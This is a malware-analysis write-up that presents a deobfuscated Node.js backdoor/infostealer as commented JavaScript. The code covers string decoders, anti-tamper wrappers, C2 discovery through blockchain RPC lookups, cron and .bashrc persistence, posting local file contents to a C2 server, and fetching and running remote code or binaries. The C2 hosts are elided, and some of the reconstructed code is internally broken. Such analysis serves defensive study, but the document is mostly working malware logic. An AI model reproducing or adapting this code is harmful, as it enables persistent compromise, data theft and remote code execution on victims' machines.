// # Deobfuscated Code Analysis

// This is **Node.js-based malware** (a backdoor/infostealer) generated with a JS obfuscator (likely `javascript-obfuscator`). Below is the structural deobfuscation and explanation 
// of each component.

// ## Structure Overview

//javascript
// ============================================================
// LAYER 1: STRING POOL (rotated array + Base64/RC4 decoder)
// ============================================================

// String pool - array of Base64-encoded, RC4-encrypted strings
function stringPool() {
    // Returns array of ~1000 Base64 strings (e.g. 'vZmWnK1uAwzSwG', 'vZrczeO4A21xtZf1', ...)
    return ['vZmWnK1uAwzSwG', 'vZrczeO4A21xtZf1', 'zJHRsvC2tdbTCq', /* ... */];
}

// Decoder: Base64 decode → RC4 decrypt → cache
function decodeString(index, key) {
    index = index - 0x1f2;  // offset correction
    let str = stringPool()[index];
    
    if (!decodeString.cache) {
        // Base64 decoder
        const base64Decode = (b64) => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            // ... standard Base64 → byte string conversion ...
            return decodeURIComponent(percentEncoded);
        };
        
        // RC4 decryption
        const rc4 = (data, key) => {
            data = base64Decode(data);
            // ... standard RC4 (KSA + PRGA) ...
            return result;
        };
        
        decodeString.decrypt = base64Decode;
        decodeString.cacheStore = {};
        decodeString.initialized = true;
    }
    
    const cacheKey = index + stringPool()[0];
    if (!decodeString.cacheStore[cacheKey]) {
        str = decodeString.decrypt(str);
        str = rc4(str, key);
        decodeString.cacheStore[cacheKey] = str;
    }
    return str;
}

// Second string pool (for the `f` decoder)
function stringPool2() {
    return ['mZmWnK1uAwzSwG', 'vZrczeO4A21xtZf1', /* ~1500 strings */];
}

// Second decoder (f) - same Base64+RC4 pattern, different key/pool
function decodeString2(index, key) {
    index = index - (0x13f5 + 0x148d - 0x26c8);  // = index - (-0x1)  → index + 1
    // ... same Base64 → RC4 pipeline with different key ...
    // Also contains an anti-tamper class that shuffles its own internals
    return decoded;
}


// ============================================================
// LAYER 2: ANTI-TAMPER / ANTI-DEBUGGING WRAPPERS
// ============================================================

// d() - Function context wrapper (binds `this` to prevent extraction)
const d = (function() {
    let firstCall = true;
    return function(context, func) {
        if (firstCall) {
            // On first invocation: if called with `this`, re-invoke properly
            if (context) {
                const result = func.call(context, arguments);
                func = null;
                return result;
            } else {
                // Dead branch - contains obfuscated shell commands
                // (red herring / anti-analysis)
            }
        }
        firstCall = false;
    };
})();

// c() - Builds an eval() equivalent via prototype chain manipulation
const c = d(this, function() {
    // Effectively: this.constructor.prototype.constructor.call(null, '...')
    // This reconstructs the Function constructor to bypass static analysis
    return this.toString()
        .match(/[a-zA-Z0-9]+/g)
        .filter(...)
        .join('')
        .constructor(c)
        .call('+$');
});
c();  // self-invoking initialization

// b() - Another function wrapper (similar to d, for the second decoder)
const b = (function() {
    let firstCall = true;
    return function(context, func) {
        if (firstCall) {
            if (context) {
                // Anti-debug: checks global scope for debugger variables
                // Attempts to access `require`, `process`, etc.
                const result = func.call(context, arguments);
                func = null;
                return result;
            }
        }
        firstCall = false;
    };
})();

// a() - Prototype tamper detection
const a = b(this, function() {
    // Wraps Object.prototype properties to detect property access
    // Sets up a Proxy-like interceptor on common methods
    const getObj = () => {
        try {
            return Function('return this')();
        } catch {
            return window;
        }
    };
    
    const obj = getObj();
    const proto = Object.getPrototypeOf(obj) || {};
    const methods = ['toString', 'constructor', 'call', 'apply', 'bind', 'hasOwnProperty', 'valueOf'];
    
    for (let i = 0; i < methods.length; i++) {
        const orig = b.prototype[methods[i]];
        const wrapped = proto[methods[i]] || orig;
        orig.call = b.call.bind(b);
        orig.apply = wrapped.apply.bind(wrapped);
        proto[methods[i]] = orig;
    }
});
a();  // initialize


// ============================================================
// LAYER 3: MAIN MALWARE LOGIC (async IIFE)
// ============================================================
(async () => {
    
    // --- Imports ---
    const fs = require('fs');
    const path = require('path');
    const crypto = require('crypto');
    const os = require('os');
    const { spawn, execSync } = require('child_process');
    
    // --- Constants ---
    const C2_BASE_URL = "https://...";        // C2 server base URL
    const DATA_DIR = path.join(__dirname, 'data');
    const DATA_FILE = path.join(DATA_DIR, 'config.json');
    const PID_FILE = path.join(__dirname, 'pid');
    
    // List of 9 C2/exfiltration endpoints to check
    const C2_ENDPOINTS = [
        "https://node-1...",
        "https://node-2...",
        "https://node-3...",
        "https://node-4...",
        "https://node-5...",
        "https://node-6...",
        "https://node-7...",
        "https://node-8...",
        "https://node-9...",
    ];
    
    let currentC2Url = C2_BASE_URL;
    let active = true;
    
    // --- Helper: Get current file path ---
    function getFilePath() {
        try {
            const file = process.argv[1] || __filename;
            return path.resolve(file);
        } catch {
            return path.join(os.tmpdir(), 'hidden', 'payload');
        }
    }
    
    const filePath = getFilePath();
    const dataDir = path.join(filePath.replace(/\.js$/, ''), 'data');
    
    // --- Helper: Read config from file ---
    function readConfig() {
        try {
            if (fs.existsSync(dataDir)) {
                const content = fs.readFileSync(dataDir, 'utf8');
                return JSON.parse(Buffer.from(content, 'base64').toString());
            }
        } catch {}
        return null;
    }
    
    // --- Helper: Write config to file ---
    function writeConfig(data) {
        try {
            fs.mkdirSync(filePath, { recursive: true, mode: 0o750 });
            const opts = { mode: 0o600 };
            fs.writeFileSync(
                dataDir,
                Buffer.from(JSON.stringify(data), 'utf8'),
                opts
            );
        } catch {}
    }
    
    // --- Helper: Get system identifier ---
    function getSystemId() {
        let id = readConfig();
        if (id && id.id) return id.id;
        
        const tmpDir = os.tmpdir();
        const machineIdPath = path.join(filePath, 'machine-id');
        try {
            if (fs.existsSync(machineIdPath)) {
                const content = fs.readFileSync(machineIdPath, 'utf8').trim();
                if (!id) id = {};
                id.id = content;
                writeConfig(id);
                return content;
            }
        } catch {}
        
        const uuid = crypto.randomUUID();
        if (!id) id = {};
        id.id = uuid;
        writeConfig(id);
        return uuid;
    }
    
    const systemId = getSystemId();
    
    // --- Helper: Sleep ---
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    
    // --- Helper: Parse hex ---
    function parseHex(hexStr) {
        if (!hexStr || hexStr.startsWith('0x') || hexStr.length < 4) return null;
        try {
            const clean = hexStr.replace('0x', '');
            const hi = parseInt(clean.slice(0, 4), 16);
            const lo = parseInt(clean.slice(hi, hi + 4), 16);
            const rest = clean.slice(hi + 4, hi + 4 + (lo - hi));
            return Buffer.from(rest, 'hex').toString('utf8');
        } catch { return null; }
    }
    
    // --- CORE: Check C2 endpoints for wallet data ---
    async function checkWallets() {
        const results = {};
        const target = parseHex("0x...");  // target wallet/contract address
        const checkList = C2_ENDPOINTS;
        
        const tasks = checkList.map(async (url) => {
            try {
                const resp = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: "2.0",
                        method: "wallet_getAddress(0)",  // or similar RPC
                        params: [{ to: target }, "eth"],
                        id: 1
                    }),
                    signal: AbortSignal.timeout(30000)
                });
                const data = await resp.text();
                if (data.id) {
                    const decoded = parseHex(data.result);
                    if (decoded && /^(https?|wss?):\/\//.test(decoded)) {
                        results[url] = decoded.trim();
                    }
                }
            } catch {}
        });
        
        await Promise.all(tasks);
        const keys = Object.keys(results);
        if (!keys.length) return null;
        
        // Score each endpoint by frequency
        const scores = {};
        keys.forEach(k => scores[k] = (scores[k] || 0) + 10);
        return Object.entries(scores)
            .sort((a, b) => b[1] - a[1])[0][0];
    }
    
    // --- CORE: Update C2 URL ---
    async function updateC2() {
        if (!active) return;
        const newUrl = await checkWallets();
        if (newUrl) currentC2Url = newUrl;
    }
    await updateC2();
    
    // --- CORE: Persistence & Execution ---
    function persistAndExecute() {
        let config = readConfig();
        if (!config || config.done) return;
        if (!config.target) return;
        
        const tmpDir = os.tmpdir();
        const targetPath = path.join(filePath, config.target);
        let executable = null;
        
        // Find the target executable in directory
        try {
            const entries = fs.readdirSync(filePath);
            for (const entry of entries) {
                const fullPath = path.join(filePath, entry, 'bin', 'main');
                if (fs.existsSync(fullPath)) {
                    executable = fullPath;
                    break;
                }
            }
        } catch {}
        
        if (!executable) executable = process.execPath;
        
        const cmd = executable + ' ' + targetPath;
        const results = [];
        
        // Attempt multiple persistence vectors
        // 1) Add to /etc/crontab
        try {
            const crontab = path.join(tmpDir, 'cron', 'crontab');
            const time = crypto.randomBytes(5).toString('hex');
            const crontabPath = path.join(crontab, time);
            fs.mkdirSync(crontab, { recursive: true, mode: 0o750 });
            const crontabEntry = "*/5 * * * * " + cmd + " >/dev/null 2>&1";
            fs.appendFileSync(crontabPath, crontabEntry, { mode: 0o600 });
            results.push('cron');
        } catch {}
        
        // 2) Add to bashrc / .bash_profile
        try {
            const bashrc = path.join(tmpDir, '.bashrc');
            const bashrcEntry = "nohup " + cmd + " &";
            if (fs.existsSync(bashrc)) {
                const content = fs.readFileSync(bashrc, 'utf8');
                if (!content.includes(targetPath)) {
                    fs.appendFileSync(bashrc, bashrcEntry);
                    results.push('bashrc');
                }
            }
        } catch {}
        
        // 3) Spawn as background process
        try {
            const spawnCmd = "nohup " + cmd + " &";
            const output = execSync(spawnCmd, {
                encoding: 'utf8',
                timeout: 5000
            });
            if (!output.includes(targetPath)) {
                const msg = "Process started:\n" + spawnCmd + "\n";
                execSync("echo '" + msg + "' >> /tmp/log", { stdio: 'ignore', timeout: 5000 });
                results.push('spawn');
            }
        } catch {}
        
        // 4) Try python/python3 execution
        try {
            const pythonPath = path.join(tmpDir, 'python3');
            if (fs.existsSync(pythonPath)) {
                const content = fs.readFileSync(pythonPath, 'utf8');
                if (!content.includes(targetPath)) {
                    fs.appendFileSync(pythonPath, "# payload\n" + cmd + "\n");
                    results.push('python');
                }
            }
        } catch {}
        
        // 5) Try shell script
        try {
            const sh = fs.readFileSync(path.join(fs, 'shell'), 'utf8');
            if (!sh) {
                config.flags = results.join(',');
                writeConfig(config);
            }
        } catch {}
    }
    
    persistAndExecute();
    
    // --- CORE: Download & Execute Payload ---
    async function downloadAndExecute() {
        let config = readConfig();
        if (!config || config.done) return;
        if (!config.payload) return;
        
        const payloadPath = path.join(filePath, config.payload);
        if (!fs.existsSync(payloadPath)) return;
        
        const content = fs.readFileSync(payloadPath, 'utf8');
        
        // POST to C2 server
        const resp = await fetch(
            currentC2Url + '/submit/' + systemId,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: content, sig: "auth_token" }),
                signal: AbortSignal.timeout(30000)
            }
        );
        
        if (!resp.ok) return;
        const result = await resp.text();
        if (!result || result.code !== 200) return;
        
        // Write response to file
        fs.writeFileSync(payloadPath, result, 'utf8');
        config.done = Date.now();
        writeConfig(config);
        
        // Spawn the downloaded binary
        const { spawn } = require('child_process');
        let execPath = process.argv[1];
        try {
            const entries = fs.readdirSync(filePath);
            for (const entry of entries) {
                const full = path.join(filePath, entry, 'bin', 'main');
                if (fs.existsSync(full)) {
                    execPath = full;
                    break;
                }
            }
        } catch {}
        
        const opts = { detached: true, stdio: 'ignore' };
        spawn(execPath, [payloadPath], opts).unref();
        
        // Exit current process (payload takes over)
        process.exit(0);
    }
    
    await downloadAndExecute();
    
    // --- CORE: C2 Command Execution (remote code loading) ---
    async function fetchRemoteCode() {
        const rand1 = crypto.randomBytes(5).toString('hex');
        const rand2 = ['id', 'b', 'q', 's', 'v'][Math.floor(Math.random() * 5)];
        const rand3 = crypto.randomBytes(5).toString('hex');
        
        const url = currentC2Url + '/cmd/' + rand1 + '/' + systemId + '/' + rand3 + '.' + 
                    ['node','js','sh','py','bin','exe'][Math.floor(Math.random() * 6)] + 
                    '?' + rand2 + '=' + "auth_token";
        
        try {
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), 30000);
            const headers = { Referer: currentC2Url };
            
            const resp = await fetch(url, { signal: controller.signal, headers });
            clearTimeout(timer);
            
            if (!resp.ok) {
                await sleep(5000);
                return;
            }
            
            const code = await resp.text();
            
            // Execute downloaded code with full access
            if (code && code.length > 100) {
                setImmediate(async () => {
                    try {
                        const fn = Object.getPrototypeOf(async function(){})
                            .constructor;
                        const executor = new fn(
                            "require", "process", "Buffer", "console", 
                            "__dirname", "__filename", "global"
                        );
                        await executor(require, process, Buffer, console, 
                                    __dirname, __filename, global);
                    } catch {}
                });
            }
        } catch (e) {
            if (e.name === 'AbortError') {
                await sleep(5000);
            }
        }
    }
    
    // --- PERIODIC C2 CHECK-IN (every ~14 minutes) ---
    let lastCheck = Date.now();
    setInterval(() => {
        if (active && (Date.now() - lastCheck > 15 * 60 * 1000)) {
            checkWallets()
                .then(url => {
                    if (url && url !== currentC2Url) currentC2Url = url;
                })
                .catch(() => {});
            lastCheck = Date.now();
        }
    }, 14 * 60 * 1000);  // ~14 minutes
    
    // --- MAIN LOOP (runs once) ---
    while (true) {
        try { await fetchRemoteCode(); } catch {}
        await sleep(3000);
        break;  // exits after one iteration
    }
    
})();
